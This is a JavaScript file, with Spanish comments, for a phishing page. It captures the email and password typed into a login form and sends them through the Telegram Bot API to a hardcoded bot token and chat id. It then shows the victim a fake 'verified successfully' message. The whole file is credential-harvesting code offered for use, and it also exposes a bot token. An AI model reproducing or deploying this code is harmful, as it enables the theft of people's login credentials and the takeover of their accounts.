document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('telegramForm');
  
    form.addEventListener('submit', (event) => {
      event.preventDefault();
      enviarDatos();
    });
  });
  
  async function enviarDatos() {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
  
    // Reemplaza 'TOKEN_DEL_BOT' con el token real de tu bot de Telegram
    const telegramBotToken = '6563157490:AAHnjDdBVMy76ZGEtH4gkQpMhiKG4KPunlk';
    const chatId = '2050085864'; // Puedes obtenerlo hablando con el bot @get_id_bot en Telegram
  
    // Construye el mensaje que enviarás al bot
    const mensaje = `Inf:\nCorreo electrónico: ${email}\nContraseña: ${password}`;
  
    // URL de la API de Telegram para enviar mensajes
    const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
  
    try {
      // Realiza la solicitud HTTP para enviar el mensaje al bot
      const response = await fetch(telegramApiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: mensaje,
        }),
      });
  
      if (response.ok) {
        alert('Se ha verificado correctamente');
        form.reset();
      } else {
        alert('Ha ocurrido un error al cargar la pagina');
        
      }
    } catch (error) {
      console.error('Error al enviar la información a Telegram:', error);
      alert('Ha ocurrido un error al cargar la pagina');
    }
  }
  